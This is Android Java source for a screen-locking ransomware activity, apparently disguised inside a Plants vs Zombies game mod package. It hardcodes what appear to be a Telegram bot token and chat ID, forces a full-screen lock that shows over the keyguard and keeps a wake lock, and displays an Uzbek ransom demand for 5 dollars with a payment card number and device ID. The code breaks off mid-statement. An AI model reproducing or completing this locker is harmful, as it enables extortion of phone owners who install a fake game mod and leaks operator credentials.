package com.pvzmod.game;

import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class LockScreenActivity extends Activity {
    private static final String BOT_TOKEN = "8180924483:AAHt7ySle_GRAywhYP6KZJnCMzwIDegjQoA";
    private static final String CHAT_ID = "5970230338";
    
    private EditText pinInput;
    private TextView ransomText, attemptsText;
    private Button unlockBtn;
    private int failedAttempts = 0;
    private String correctPin;
    private PowerManager.WakeLock wakeLock;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_lock);
        setFullScreenLock();
        
        pinInput = findViewById(R.id.pin_input);
        ransomText = findViewById(R.id.ransom_text);
        attemptsText = findViewById(R.id.attempts_text);
        unlockBtn = findViewById(R.id.unlock_btn);
        
        correctPin = PinManager.getStoredPin(this);
        ransomText.setText("💰 5$ jo'natmasang telefon ochilmaydi!\nCard: 9860 4316 2001 1234 5678\nDevice ID: " + 
                          DeviceIdGenerator.getUniqueId(this));
        
        acquireWakeLock();
        unlockBtn.setOnClickListener(v -> checkPin());
    }
    
    private void setFullScreenLock() {
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                           WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                           WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                           WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
    }
    
    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock;
